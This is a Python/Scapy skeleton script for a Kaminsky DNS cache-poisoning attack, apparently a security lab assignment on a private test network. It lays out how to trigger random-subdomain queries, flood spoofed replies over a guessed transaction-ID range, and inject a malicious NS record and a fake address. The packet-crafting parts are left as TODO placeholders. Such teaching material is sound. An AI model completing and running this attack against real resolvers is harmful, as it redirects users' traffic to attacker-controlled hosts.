#!/usr/bin/python3
from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, send, sr1
import random
import string
import time

RESOLVER_IP = "10.19.0.53"
AUTH_SERVER_IP = "10.19.0.153"
TARGET_ZONE = "example.com"
TARGET_NAME = "" #TODO
FAKE_IP = "" #TODO
MALICIOUS_NS = "ns.attacker.example.com"
TXID_MIN = 10000
TXID_MAX = 10005
MAX_ATTEMPTS = 30
RESOLVER_FIXED_PORT = 33333


def random_label(length=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(length))


def trigger_random_query(name):
    # TODO: Send a DNS query for the given name to the resolver
    # Do not wait for a response; we want to race spoofed replies immediately.
    send(pkt, verbose=0)


def flood_spoofed_responses(victim_name):
    qd = # TODO Craft a DNS question section for the victim name and type A query
    an = # TODO Craft a DNS answer section with the victim name 
    ns = # TODO Craft a DNS authority section with the target zone and malicious NS
    ar_ns = # TODO Craft a DNS additional section with the malicious NS and FAKE_IP
    ar_www = # TODO Craft a DNS additional section with the TARGET_NAME and the FAKE_IP

    packets = []
    for txid in range(TXID_MIN, TXID_MAX + 1):
        packets.append(
            IP(src=AUTH_SERVER_IP, dst=RESOLVER_IP)
            / UDP(sport=53, dport=RESOLVER_FIXED_PORT)
            / DNS(
                id=txid,
                qr=1,
                aa=1,
                rd=1,
                ra=1,
                qd=qd,
                ancount=1,
                nscount=1,
                arcount=2,
                an=an,
                ns=ns,
                ar=ar_ns/ar_www,
            )
        )

    for _ in range(4):
        send(packets, verbose=0)


def check_poisoned():
    # TODO: Send a DNS query for TARGET_NAME to the resolver and check if the response contains FAKE_IP as the answer.
    return 


if __name__ == "__main__":
    print("[*] Kaminsky demo started")
    print(f"[*] Resolver TXID range assumed: [{TXID_MIN}, {TXID_MAX}]")

    for attempt in range(1, MAX_ATTEMPTS + 1):
        victim = f"{random_label()}.{TARGET_ZONE}"
        print(f"[*] Attempt {attempt}/{MAX_ATTEMPTS}: {victim}")

        trigger_random_query(victim)
        flood_spoofed_responses(victim)

        ok, observed = check_poisoned()
        if ok:
            print(f"[+] SUCCESS: {TARGET_NAME} -> {observed}")
            break
        print(f"[-] Not poisoned yet (observed: {observed})")
        time.sleep(0.1)
    else:
        print("[!] Failed to poison cache within attempts")
